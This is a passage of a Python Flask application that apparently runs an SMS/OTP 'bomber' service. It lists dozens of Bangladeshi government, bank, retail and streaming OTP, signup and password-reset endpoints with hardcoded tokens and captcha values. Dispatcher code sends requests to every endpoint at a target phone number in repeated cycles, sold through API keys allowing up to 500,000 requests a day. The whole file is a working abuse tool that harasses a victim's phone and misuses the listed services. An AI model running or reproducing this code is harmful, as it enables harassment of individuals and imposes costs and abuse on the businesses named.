            "payload": {"full_name": "user", "company_name": "company", "email_address": "user@example.com", "phone_number": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 71. Training Gov BD ===
        {
            "name": "Training Gov BD OTP",
            "url": "https://training.gov.bd/backoffice/api/user/sendOtp",
            "headers": {"Content-Type": "application/json"},
            "payload": {"phone": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 72. MOST Gov BD ===
        {
            "name": "MOST Gov BD OTP",
            "url": "https://gateway.most.gov.bd/auth/oauth/send-otp",
            "headers": {"Content-Type": "application/json", "X-Api-Key": "4rhwlff8q4q860qsb9utv73x12nua8h7", "X-App-Identifier": "SecurityUI"},
            "raw_body": '{"name":"User {random}","email":"user{random}@example.com","phone":"{phone}","registration_type":1,"captcha_token":"511fb2f2ed6211d2a471a7af9a0fa140","recaptcha_token":"test","captcha_input_value":"XU3Q","otp_send":"SMS"}',
            "phone_format": "as_is"
        },
        
        # === 73. Deshal.net ===
        {
            "name": "Deshal.net Login",
            "url": "https://app.deshal.net/api/auth/login",
            "headers": {"Content-Type": "application/json"},
            "payload": {"phone": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 74. Pathao Merchant ===
        {
            "name": "Pathao Merchant OTP",
            "url": "https://merchant.pathao.com/api/v1/merchants/verification/phone/send-otp",
            "headers": {"Content-Type": "application/json", "Authorization": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.test"},
            "payload": {"phone": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 75. Dhaka Bank ===
        {
            "name": "Dhaka Bank OTP",
            "url": "https://ezybank.dhakabank.com.bd/ekyc/MOBILE_NO_VERIFICATION/MOBILE_NO_VERIFICATION_OTP_GENARATION",
            "headers": {"Content-Type": "application/json", "X-Requested-With": "XMLHttpRequest"},
            "payload": {"mobile": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 76. eCourier ===
        {
            "name": "eCourier OTP",
            "url": "https://backoffice.ecourier.com.bd/api/web/individual-send-otp",
            "headers": {"Content-Type": "application/json"},
            "payload": {"mobile": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 77. Binge ===
        {
            "name": "Binge OTP",
            "url": "https://api.binge.buzz/api/v4/auth/otp/send",
            "headers": {"Content-Type": "application/json", "x-platform": "web"},
            "payload": {"phone": "{phone}"},
            "phone_format": "with_plus_880"
        },
        
        # === 78. Bohubrihi ===
        {
            "name": "Bohubrihi OTP",
            "url": "https://bb-api.bohubrihi.com/public/activity/otp",
            "headers": {"Content-Type": "application/json"},
            "payload": {"phone": "{phone}", "intent": "login"},
            "phone_format": "as_is"
        },
        
        # === 79. Rokomari ===
        {
            "name": "Rokomari OTP",
            "url": "https://www.rokomari.com/otp/send",
            "headers": {"x-requested-with": "XMLHttpRequest", "Content-Type": "application/json"},
            "params": {"countryCode": "BD"},
            "payload": {"emailOrPhone": "{phone}"},
            "phone_format": "with_880"
        },
        
        # === 80. PIOBD ===
        {
            "name": "PIOBD Login",
            "url": "https://piobd.com/login",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "payload": {"f_mobilenumber": "{phone}", "frf_calculatereg": "9"},
            "phone_format": "as_is"
        },
        
        # === 81. Shopping Corner ===
        {
            "name": "Shopping Corner OTP",
            "url": "https://api.shoppingcorner.com.bd/index.php",
            "headers": {"Content-Type": "application/json", "x_ocmod_session_id": "8b3873d23e8cf37a6912017365"},
            "params": {"route": "vapi/account/otp"},
            "payload": {"phone": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 82. China Online BD ===
        {
            "name": "China Online BD OTP",
            "url": "https://chinaonlinebd.com/api/login/getOtp",
            "headers": {"token": "45601f3d391886fcec5f5a3f26780f21", "Content-Type": "application/json"},
            "payload": {"phone": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 83. ACS Future School ===
        {
            "name": "ACS Future School OTP",
            "url": "https://auth.acsfutureschool.com/api/v1/otp/send",
            "headers": {"Content-Type": "application/json"},
            "payload": {"phone": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 84. Bazaar Bangladesh ===
        {
            "name": "Bazaar Bangladesh OTP",
            "url": "https://bazaarbangladesh.com/send/verify/code/{phone}",
            "headers": {"x-requested-with": "XMLHttpRequest", "Content-Type": "application/json"},
            "phone_format": "as_is"
        },
        
        # === 85. Prime Bazar ===
        {
            "name": "Prime Bazar OTP",
            "url": "https://primebazar.com/registration/verification-code-send",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "payload": {"_token": "lCK5AfqQKEpkfPFgzQMNtRx2jD82Yn5fNLrRzmOd", "type": "customer", "phone": "{phone}", "country_code": "88", "email": ""},
            "phone_format": "as_is"
        },
        
        # === 86. Mobile Books BD ===
        {
            "name": "Mobile Books BD OTP",
            "url": "https://mobilebooksbd.com/login/login/log1/logotp.php",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "params": {"number": "{phone}"},
            "phone_format": "with_880"
        },
        
        # === 87. BD Books ===
        {
            "name": "BD Books Password Reset",
            "url": "https://bdbooks.net/password/reset",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "payload": {"_token": "test_token", "phone": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 88. Swap ===
        {
            "name": "Swap OTP",
            "url": "https://api.swap.com.bd/api/v1/send-otp/v2",
            "headers": {"Content-Type": "application/json", "signature": "zWDW4fyr9fnEGxRxzN3Q0yMOlMKctqFHBMLGBFcCVqU="},
            "payload": {"phone": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 89. Ali2BD ===
        {
            "name": "Ali2BD Login",
            "url": "https://edge.ali2bd.com/api/consumer/v1/auth/login",
            "headers": {"Content-Type": "application/json"},
            "payload": {"username": "{phone}"},
            "phone_format": "with_plus_880"
        },
        
        # === 90. MoveOnBD ===
        {
            "name": "MoveOnBD OTP",
            "url": "https://moveonbd.com/api/v1/customer/auth/phone/request-otp",
            "headers": {"Content-Type": "application/json"},
            "payload": {"phone": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 91. Gorilla Move ===
        {
            "name": "Gorilla Move OTP",
            "url": "https://api.gorillamove.com/api/v1/core/account/phone_login",
            "headers": {"Content-Type": "application/json"},
            "payload": {"phone_number": "{phone}", "step": 1},
            "phone_format": "as_is"
        },
        
        # === 92. Qcoom ===
        {
            "name": "Qcoom OTP",
            "url": "https://auth.qcoom.com/api/v1/otp/send",
            "headers": {"Content-Type": "application/json"},
            "payload": {"mobileNumber": "{phone}"},
            "phone_format": "with_plus_880"
        },
        
        # === 93. Sailor ===
        {
            "name": "Sailor Signup",
            "url": "https://backend.sailor.clothing/api/v2/auth/signup",
            "headers": {"Content-Type": "application/json"},
            "payload": {"country_code": "BD", "phone": "{phone}", "email": "user@gmail.com", "password": "Password123", "password_confirmation": "Password123"},
            "phone_format": "as_is"
        },
        
        # === 94. Food Collections ===
        {
            "name": "Food Collections OTP",
            "url": "https://foodcollections.com/api/v1/auth/login",
            "headers": {"Content-Type": "application/json"},
            "payload": {"phone": "{phone}", "login_type": "otp", "type": "phone", "guest_id": "17091"},
            "phone_format": "with_plus_880"
        },
        
        # === 95. English Moja ===
        {
            "name": "English Moja Login",
            "url": "https://api.englishmojabd.com/api/v1/auth/login",
            "headers": {"Content-Type": "application/json"},
            "payload": {"phone": "{phone}"},
            "phone_format": "with_plus_880"
        },
        
        # === 96. Manam ===
        {
            "name": "Manam OTP",
            "url": "https://manambd.com/_public/api/send/otp",
            "headers": {"Content-Type": "application/json"},
            "payload": {"mobile_no": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 97. Lazz Pharma ===
        {
            "name": "Lazz Pharma OTP",
            "url": "https://www.lazzpharma.com/MessagingArea/OtpMessage/WebRegister",
            "headers": {"Content-Type": "application/json"},
            "payload": {"ActivityId": "c94ddc0e-9aaf-425f-8ef2-7bba80b15456", "Phone": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 98. Medico Bio ===
        {
            "name": "Medico Bio Login",
            "url": "https://api.v2.medico.bio/patient/passwordless-login",
            "headers": {"Content-Type": "application/json", "Authorization": "Bearer"},
            "payload": {"phoneNumber": "{phone}", "deviceId": "{phone}", "channel": "web", "userType": "patient", "type": "newUser"},
            "phone_format": "as_is"
        },
        
        # === 99. Cookups ===
        {
            "name": "Cookups OTP",
            "url": "https://api.cookups.app/api/v1/subject/Session/actMaybeConstruct/O3DjV-zO0km_pSNaeBAf6Q",
            "headers": {"Content-Type": "application/json"},
            "raw_body": '{"Action":["GenerateOtp",{"Value_":["BdMobileNumber","+880{phone}"]}],"Constructor":["NewFromId",["SessionId","57e3703b-ceec-49d2-bfa5-235a78101fe9"]]}',
            "phone_format": "remove_leading_zero"
        },
        
        # === 100. Toffee Live ===
        {
            "name": "Toffee Live OTP",
            "url": "https://prod-services.toffeelive.com/sms/v1/subscriber/otp",
            "headers": {"Content-Type": "application/json", "Authorization": "Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.test"},
            "payload": {"target": "{phone}", "resend": False},
            "phone_format": "with_880"
        },
        
        # === 101. Bongo BD ===
        {
            "name": "Bongo BD OTP",
            "url": "https://accounts.bongobd.com/realms/bongo/login-actions/authenticate",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "payload": {"country": "+880", "phone_number": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 102. Hoichoi ===
        {
            "name": "Hoichoi OTP",
            "url": "https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code",
            "headers": {"Content-Type": "application/json"},
            "payload": {"phoneNumber": "{phone}", "platform": "MOBILE_WEB"},
            "phone_format": "with_plus_880"
        },
        
        # === 103. Foodi BD ===
        {
            "name": "Foodi BD Register",
            "url": "https://api.foodibd.com/users/api/Authentication/Customer/Register",
            "headers": {"Content-Type": "application/json"},
            "raw_body": '{"email":null,"mobileNumber":"{phone}","password":"zJuam9z!mqeT3xy","isEmail":false,"captcha":"test"}',
            "phone_format": "as_is"
        },
        
        # === 104. Ostad ===
        {
            "name": "Ostad OTP",
            "url": "https://api.ostad.app/api/v2/user/with-otp",
            "headers": {"Content-Type": "application/json", "guestid": "d84738cc-ebb9-4eb9-a9a8-a2633787e1a9"},
            "payload": {"msisdn": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 105. Khabar Manager ===
        {
            "name": "Khabar Manager OTP",
            "url": "https://khabarmanager.xyz/api/send_otp.php",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "payload": {"number": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 106. Ryan's ===
        {
            "name": "Ryan's Register",
            "url": "https://www.ryans.com/customers/register",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "payload": {"_token": "ZP5rbmt1JfU5yghF34EgHatenY8PRoHZtNx0wAv6", "code": "880", "phone": "{phone}", "password": "@Jubair1122", "reCaptcha": "724293", "captcha": "724293"},
            "phone_format": "remove_leading_zero"
        },
        
        # === 107. Jahaji BD ===
        {
            "name": "Jahaji BD Signup",
            "url": "https://appconnect.jahajibd.com/client_api_v2/Client/SignUp",
            "headers": {"Content-Type": "application/json"},
            "payload": {"mobile": "{phone}", "client_name": "test", "company_name": "testa"},
            "phone_format": "as_is"
        },
        {
            "name": "Jahaji BD Reset",
            "url": "https://appconnect.jahajibd.com/client_api_v2/Client/ResetPassword",
            "headers": {"Content-Type": "application/json"},
            "payload": {"mobile": "{phone}", "app_hash_string": "Av6BDU+LO75"},
            "phone_format": "as_is"
        },
        
        # === 108. Chaldal ===
        {
            "name": "Chaldal OTP",
            "url": "https://chaldal.com/yolk/api-v4/Auth/RequestOtpVerificationWithApiKey",
            "headers": {"Content-Type": "application/json", "x-egg-clientapp": "Omelette"},
            "params": {"apiKey": "0cAFcWeA689NYOqWNehidbOnYP54Oz_i6uHYHW1UXzeVyVxTIAHlJOiSjr7aMQKO6ec7ZInA9EOaSUFzuUebDUqZMiUutakjTsBjgrP_5k0BhYQzf27UCWrtUBGagLeZZaJ7aeCFKfGU-vhlJMlzhfHTRB_6-gzesrxBQwL0zns1PXJXprrt3Ww6nsOGgfLv-EY4Opda_ankSjDr-LDA_9uSLmTKpZojXqAfVBPTNY34NBuOhItB_AUHqmT1i8SO6lHsoj161hWhccvBEiTRLla6mhRl3JRUsMYP1qBfqO6TiSojcZPN8uP_9UrD-J3ftgGJJWP1e2Sa03lGxJOjDDfhvsCz04UibLGbpZJ277e1x7mKIbunOjgUPKkrVzY8Sw6aBRYHatQEpstzP1JK08JU-VZECQE4BXoauSeMbJ__7Ooo1FTz3qfrlYyCPnDUk0E2i8zPZ3l6nhKAhwshzNTVNCyn-5aA86-rlA4mf3eZzLlvy8dAIGfKCNZvb_dpuO7BtOei6S6vXoBChMsI0ussHW1uE7j0o5Syt9clDF-VtIbOksGO26PW8jGWbfIswihG3LX5RVSgA1SixrFk79MKPbZ1pXxlhL89o42URt1BksqQa4xasGwZvG3ARpKhn5N17IcyWgmx-9MumTke5cTnmNbZzXwbRM_DJpAtl_X3NZz5DKW34K33Mge59GaeDwXDdc5nx_8FMCrNlq7fc3aZldRHiHYbOhhf9DZsbHtfvcYvGzpB7jTQArO7gwFkvmr0G8Tiy2wBOG9B5rLb03A8OGC4iPW3r9OBQJEGThX0MxIxH7QLkEdhzQouMC1wZQtlWVTSF3cy6Oc9HDdxmr7mIrN12OK_4OHUSedX27g-dqfVFSBfMgqZULCtykIjZM1KbsRtcIi-mdD36GUJ7ID6UoM1uxLw0ZfOb7FPKmAteqvAanHE3ndOYp5fIG3wrJokIgHAauzvXmdwIFJ_jGh1sXZGpgjGbjwjf0UHRrLGsTITPt8JJdvBP27a96B7D4VOue8OvqD5I8OYwRsIpaNwy2Y5wgMT5bkdEGo3zBCAp1wcYVn-INvFXpN6MDUF-vePeuKVKruZeKJMQytxZWwOxn8qp62sI1sci3XHwjxo6ikVW18EiZT9bPSaQy3WkuiNvii3O1Ym0FQ_rXS5mWH5WwzdbJxGEBX5aMQoOqtvIAn1bjZkZQziL0yhpckYV9nsNCkdDje4bkHUGvSPId9B3OBY3UhA3vZK91yVKMSkxnDBkx4Th_ic_UW6wI5kjZmzZHrdikoPnIb-9Aopjlbbdx5N6OWy7lcQ60zFGpGH-e5rgGhiOBR0Bv6GgO45refaSLH5eDL1OWuMtdsWc2zjU8_C1Qt_DcqAcVR-DrC3fjuu2Nh5CR1R3rPpOvSZH-uQJhHwJe4f33UyzbuYgNZKZTrrwaN--niAjttLoDzvXMSLp1R0_27uK2afD-rcdNaUTRr7UK9nfhCCVXKjRJOEaDz-yF8MgFjEaYHdwJBX7u3BYRRMWDpMD7c_qgfQ20z-eB9W0rSsF069xjKOSDYlrf1heR0Cu4NxrS3lCbyvt3GtpwCo30O3kZha21Yi9MTvX4oQqYKNzo0lXGujWjotq0KI-AytYZStR6_8Ed9Tj8bMwd__pH9k4BTptVOSO9WSTu7OwG8kLJlH-4RiugYTKjSpuJCh_Ig8YzWAHjD20y2_D5aynbR-DvQBbw_2KEz9vTr6KzdcoZNyPkxy3x_PMGvOYrN7-Gl9krhIUgWsKatxsS09-CZh7xqbB0WNPlY-WA3lS1uUr5fagEuJzT2Ko2zQf-PBCgxmCWEgj6OePtR52WIcpK_kSP6ViZWB_wK4Nxj2Kpkuts4Ee-hobfl_WdhEag1lcK4fHRp0zyYdj80z3TIJfmWlILjvW-3FPOoSRdvdeQqTveoxK7F-B4VWDgRZp8FqkQbD7WA2_YphlzXJKnk69Dm3Jymdua4OSOlx8C9f6fzGYUw-RvVvo0mCHmwJtOg0iNc96yJr5W8_IZLOOVaeuXNpSgSl3D5NzwChNJ9rFCUrTT3qtAgm2v_GbaqSbY23YvEJSXzNjqbU1Whv9Hsi4gA3PNoIqVMpbAIQUNKMn5n979fTUCXOsfwzGYihJAcWO4CUVy6D1SeXijP3iTP-1b6ZEAbEY3U6mkcQ22hQzF8Y9rQSSB8yH7Djcxq7KAPtxSd7FW9F04BxeG_aOxNYxJ8cuPkh_VA4OfCskDmPmd9Msiy6gikf1pVR4pvCs5f0a_w0ypqDcee33TX_CUHjeyR-Q6ei6n2zARI394lvsG6RNiy6ZdRYKzwRctAPTgtFQKjsyoxtC6zdSFbNkOJfTH2gY", "phoneNumber": "{phone}", "retryAttempt": "0"},
            "phone_format": "with_plus_880"
        },
        
        # === 109. Boighor ===
        {
            "name": "Boighor OTP",
            "url": "https://api.boighor.com/api/signup",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "payload": {"retrieve": "0", "msisdn": "{phone}", "fromsrc": "web"},
            "phone_format": "with_880"
        },
        {
            "name": "Boighor Forgot",
            "url": "https://api.boighor.com/api/signup",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "payload": {"retrieve": "1", "msisdn": "{phone}", "fromsrc": "web"},
            "phone_format": "with_880"
        },
        
        # === 110. Le Reve Craze ===
        {
            "name": "Le Reve Craze OTP",
            "url": "https://www.lerevecraze.com/login/verify_phone",
            "headers": {"Content-Type": "application/x-www-form-urlencoded", "x-requested-with": "XMLHttpRequest"},
            "payload": {"mobile_no": "{phone}", "resend": "0", "recaptcha_token": "test"},
            "phone_format": "as_is"
        },
        
        # === 111. BJ X Coder ===
        {
            "name": "BJ X Coder Bomber",
            "url": "https://bj-x-coder.top/bo_m_ber.php",
            "headers": {"Content-Type": "application/json"},
            "payload": {"phone": "{phone}", "amount": "1"},
            "phone_format": "as_is"
        },
    ]


APIS = get_all_apis()

# ==================== ডাটাবেজ / ফাইল হ্যান্ডেলিং ====================
def load_keys():
    keys = {}
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and '=' in line and not line.startswith('#'):
                        parts = line.split('=', 1)
                        if len(parts) == 2:
                            key_name = parts[0].strip()
                            key_parts = parts[1].strip().split('|')
                            keys[key_name] = {
                                "expires": key_parts[0].strip(),
                                "daily_limit": int(key_parts[1].strip()),
                                "requests_today": 0,
                                "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                            }
        except Exception:
            pass

    if not keys:
        keys["jubair_pro"] = {
            "expires": "2030-12-31",
            "daily_limit": 500000,
            "requests_today": 0,
            "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        save_keys(keys)
    return keys

def save_keys(keys):
    try:
        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
            f.write("# API Keys Configuration\n")
            f.write("# Format: key_name=expire_date|daily_limit\n\n")
            for key_name, info in keys.items():
                f.write(f"{key_name}={info['expires']}|{info['daily_limit']}\n")
    except Exception:
        pass

def load_stats():
    if os.path.exists(STATS_FILE):
        try:
            with open(STATS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except: pass
    return {"total_requests": 0, "total_success": 0, "total_failed": 0, "logs": []}

def save_stats(stats):
    try:
        with open(STATS_FILE, 'w', encoding='utf-8') as f:
            json.dump(stats, f, indent=2)
    except: pass

VALID_KEYS = load_keys()
STATS = load_stats()


# ==================== সিকিউরিটি মিডলওয়্যার ====================
def require_api_key(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        key = request.args.get('key') or request.headers.get('X-API-Key')
        if not key or key not in VALID_KEYS:
            return jsonify({"success": False, "error": "Invalid or missing API key"}), 401
        info = VALID_KEYS[key]
        if datetime.now().strftime("%Y-%m-%d") > info["expires"]:
            return jsonify({"success": False, "error": "API key expired"}), 401
        if info["requests_today"] >= info["daily_limit"]:
            return jsonify({"success": False, "error": "Daily limit exceeded"}), 429
        request.key_info = info
        request.key_name = key
        return f(*args, **kwargs)
    return decorated

def require_admin_api(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('X-Admin-Token')
        if not token or not check_password_hash(ADMIN_HASH, token):
            return jsonify({"success": False, "error": "Unauthorized Access! Bad Token."}), 403
        return f(*args, **kwargs)
    return decorated


# ==================== কোর ডিসপ্যাচার লজিক ====================
def send_single_request(api: dict, phone: str, random_num: int = None) -> dict:
    try:
        format_type = api.get("phone_format", "as_is")
        formatted_phone = format_phone(phone, format_type)
        url = api["url"]
        if "{phone}" in url:
            url = url.replace("{phone}", formatted_phone)
        headers = api.get("headers", {}).copy()
        headers["User-Agent"] = headers.get("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        headers["Accept"] = headers.get("Accept", "application/json")
        params = api.get("params", {}).copy() if api.get("params") else {}
        for k, v in params.items():
            if isinstance(v, str):
                params[k] = v.replace("{phone}", formatted_phone)
                if random_num: params[k] = params[k].replace("{random}", str(random_num))
        payload = None
        json_payload = None
        if "raw_body" in api and api["raw_body"]:
            payload = api["raw_body"].replace("{phone}", formatted_phone)
            if random_num: payload = payload.replace("{random}", str(random_num))
        elif "payload" in api and api["payload"]:
            if isinstance(api["payload"], dict):
                json_payload = {}
                for k, v in api["payload"].items():
                    val = str(v).replace("{phone}", formatted_phone)
                    if random_num: val = val.replace("{random}", str(random_num))
                    if val.lower() == "true": val = True
                    elif val.lower() == "false": val = False
                    json_payload[k] = val
            else:
                payload = str(api["payload"]).replace("{phone}", formatted_phone)
        if json_payload:
            resp = requests.post(url, params=params, json=json_payload, headers=headers, timeout=10, verify=False)
        else:
            resp = requests.post(url, params=params, data=payload, headers=headers, timeout=10, verify=False)
        return {"api_name": api["name"], "success": resp.status_code in [200, 201, 202, 400], "status_code": resp.status_code}
    except Exception:
        return {"api_name": api["name"], "success": False, "status_code": 0}

def dispatch_requests(phone: str, amount: int):
    results = []
    for r in range(amount):
        random_num = random.randint(10000, 99999)
        for api in APIS:
            result = send_single_request(api, phone, random_num)
            results.append(result)
            STATS["total_requests"] += 1
            if result["success"]: STATS["total_success"] += 1
            else: STATS["total_failed"] += 1
        if r < amount - 1:
            time.sleep(0.5)
    save_stats(STATS)
    return results


# ==================== পাবলিক API রাউটস ====================
@app.route('/api/v1/execute', methods=['GET', 'POST'])
@require_api_key
def execute_task():
    data = request.get_json() if request.is_json else request.args
    phone = data.get('target', data.get('phone', ''))
    amount = int(data.get('amount', 1))
    phone = ''.join(filter(str.isdigit, str(phone)))
    if len(phone) < 10:
        return jsonify({"success": False, "error": "Invalid phone number."}), 400
    VALID_KEYS[request.key_name]["requests_today"] += amount
    save_keys(VALID_KEYS)
    results = dispatch_requests(phone, amount)
    return jsonify({
        "success": True,
        "target": phone,
        "cycles": amount,
        "successful": sum(1 for r in results if r["success"]),
        "failed": sum(1 for r in results if not r["success"]),
        "remaining_quota": VALID_KEYS[request.key_name]["daily_limit"] - VALID_KEYS[request.key_name]["requests_today"],
        "data": results
    })

@app.route('/api/status', methods=['GET'])
@require_api_key
def api_status():
    info = VALID_KEYS[request.key_name]
    return jsonify({
        "success": True,
        "key": request.key_name,
        "usage": {
            "used_today": info["requests_today"],
            "daily_limit": info["daily_limit"],
            "remaining": info["daily_limit"] - info["requests_today"],
            "expires_on": info["expires"],
            "created_on": info["created"]
        }
    })

@app.route('/api/list', methods=['GET'])
@require_api_key
def list_apis():
    return jsonify({
        "success": True,
        "total": len(APIS),
        "apis": [{"index": i, "name": a["name"]} for i, a in enumerate(APIS)]
    })

@app.route('/api/stats', methods=['GET'])
@require_api_key
def get_stats():
    return jsonify({
        "success": True,
        "stats": {
            "total_requests": STATS["total_requests"],
            "total_success": STATS["total_success"],
            "total_failed": STATS["total_failed"],
            "success_rate": round(STATS["total_success"] / STATS["total_requests"] * 100, 2) if STATS["total_requests"] > 0 else 0,
            "recent_logs": STATS["logs"][-20:]
        }
    })


# ==================== এডমিন API রাউটস ====================
@app.route('/admin/api/keys', methods=['GET'])
@require_admin_api
def admin_list_keys():
    keys_data = [{"key": k, **v} for k, v in VALID_KEYS.items()]
    return jsonify({"success": True, "keys": keys_data, "total": len(keys_data)})

@app.route('/admin/api/keys/add', methods=['POST'])
@require_admin_api
def admin_add_key():
    data = request.get_json() or {}
    key_name = data.get('key', '').strip()
    if not key_name:
        return jsonify({"success": False, "error": "Key name required"}), 400
    if key_name in VALID_KEYS:
        return jsonify({"success": False, "error": "Key already exists"}), 400
    VALID_KEYS[key_name] = {
        "expires": data.get('expires', (datetime.now() + timedelta(days=365)).strftime("%Y-%m-%d")),
        "daily_limit": int(data.get('limit', data.get('daily_limit', 1000))),
        "requests_today": 0,
        "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    save_keys(VALID_KEYS)
    return jsonify({"success": True, "message": f"Key '{key_name}' added"})

@app.route('/admin/api/keys/remove', methods=['POST'])
@require_admin_api
def admin_remove_key():
    key_name = (request.get_json() or {}).get('key', '').strip()
    if not key_name:
        return jsonify({"success": False, "error": "Key name required"}), 400
    if key_name not in VALID_KEYS:
        return jsonify({"success": False, "error": "Key not found"}), 404
    del VALID_KEYS[key_name]
    save_keys(VALID_KEYS)
    return jsonify({"success": True, "message": f"Key '{key_name}' removed"})

@app.route('/admin/api/keys/update', methods=['POST'])
@require_admin_api
def admin_update_key():
    data = request.get_json() or {}
    key_name = data.get('key', '').strip()
    if not key_name or key_name not in VALID_KEYS:
        return jsonify({"success": False, "error": "Invalid key"}), 404
    if 'daily_limit' in data:
        VALID_KEYS[key_name]["daily_limit"] = int(data['daily_limit'])
    if 'expires' in data:
        VALID_KEYS[key_name]["expires"] = data['expires']
    save_keys(VALID_KEYS)
    return jsonify({"success": True, "message": f"Key '{key_name}' updated"})

@app.route('/admin/reset', methods=['POST'])
@require_admin_api
def admin_reset_stats():
    global STATS
    STATS = {"total_requests": 0, "total_success": 0, "total_failed": 0, "logs": []}
    save_stats(STATS)
    return jsonify({"success": True, "message": "Statistics reset successfully"})

@app.route('/admin/reset_daily', methods=['POST'])
@require_admin_api
def admin_reset_daily():
    for key in VALID_KEYS:
        VALID_KEYS[key]["requests_today"] = 0
    save_keys(VALID_KEYS)
    return jsonify({"success": True, "message": "All daily limits reset"})


# ==================== স্মার্ট 404 + এরর হ্যান্ডলার ====================
import difflib

ALL_ROUTES = [
    "/", "/docs", "/api/v1/execute", "/api/status", "/api/list", "/api/stats",
    "/admin/api/keys", "/admin/api/keys/add", "/admin/api/keys/remove",
    "/admin/api/keys/update", "/admin/reset", "/admin/reset_daily", "/admin/login"
]

@app.errorhandler(404)
def not_found(e):
    path = request.path
    matches = difflib.get_close_matches(path, ALL_ROUTES, n=1, cutoff=0.5)
    if matches:
        return jsonify({
            "success": False,
            "error": "Route not found",
            "did_you_mean": matches[0],
            "path": path
        }), 404
    return render_template_string(_ERROR_HTML, code=404, msg="Page Not Found"), 404

@app.errorhandler(405)
def method_not_allowed(e):
    return jsonify({"success": False, "error": "Method not allowed", "path": request.path}), 405

@app.errorhandler(500)
def server_error(e):
    return render_template_string(_ERROR_HTML, code=500, msg="Internal Server Error"), 500


# ==================== ইনলাইন HTML টেমপ্লেটস ====================

_ERROR_HTML = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>{{ code }} — Error</title>
<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@800&display=swap" rel="stylesheet">
<style>
:root{--bg:#0c0c0f;--card:#13131a;--border:#1e1e2e;--accent:#7c6af7;--red:#f76a6a;--text:#e0deff;--muted:#6b6b8a}
*{margin:0;padding:0;box-sizing:border-box}
body{background:var(--bg);color:var(--text);font-family:'Space Mono',monospace;min-height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden}
body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(var(--border) 1px,transparent 1px),linear-gradient(90deg,var(--border) 1px,transparent 1px);background-size:40px 40px;opacity:.35;pointer-events:none}
body::after{content:'';position:fixed;width:500px;height:500px;background:radial-gradient(circle,#7c6af718 0%,transparent 70%);top:50%;left:50%;transform:translate(-50%,-50%);pointer-events:none;animation:blob 4s ease-in-out infinite}
@keyframes blob{0%,100%{transform:translate(-50%,-50%) scale(1)}50%{transform:translate(-50%,-50%) scale(1.2)}}
.wrap{position:relative;z-index:10;text-align:center;padding:24px;max-width:480px;width:100%}
.logo{font-size:11px;letter-spacing:.3em;color:var(--muted);text-transform:uppercase;margin-bottom:28px;display:flex;align-items:center;justify-content:center;gap:8px;animation:up .6s ease both}
.dot{width:6px;height:6px;border-radius:50%;background:var(--accent);box-shadow:0 0 8px var(--accent);animation:blink 2s infinite}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.2}}
svg.illo{width:220px;height:190px;margin-bottom:4px;animation:up .8s ease .2s both}
.code{font-family:'Syne',sans-serif;font-size:clamp(72px,18vw,108px);font-weight:800;line-height:1;color:transparent;-webkit-text-stroke:2px var(--accent);text-shadow:0 0 40px #7c6af733;letter-spacing:-.04em;animation:up .7s ease .4s both}
.title{font-family:'Syne',sans-serif;font-size:18px;font-weight:800;margin-top:4px;margin-bottom:8px;animation:up .7s ease .5s both}
.sub{font-size:11px;color:var(--muted);margin-bottom:28px;line-height:1.7;animation:up .7s ease .55s both}
.wire{width:100%;max-width:340px;margin:0 auto 28px;height:2px;background:linear-gradient(90deg,transparent,#4a4a6a,var(--red),#4a4a6a,transparent);position:relative;animation:up .7s ease .6s both}
.wire::before,.wire::after{content:'';position:absolute;top:50%;transform:translateY(-50%);width:7px;height:7px;border-radius:50%;background:var(--red);box-shadow:0 0 10px var(--red)}
.wire::before{left:28%}.wire::after{right:28%}
.btns{display:flex;flex-direction:column;gap:10px;max-width:300px;margin:0 auto;animation:up .7s ease .7s both}
.btn{display:flex;align-items:center;justify-content:center;gap:8px;padding:13px 24px;border-radius:10px;font-family:'Space Mono',monospace;font-size:12px;font-weight:700;text-decoration:none;transition:all .2s;letter-spacing:.04em;border:none;cursor:pointer}
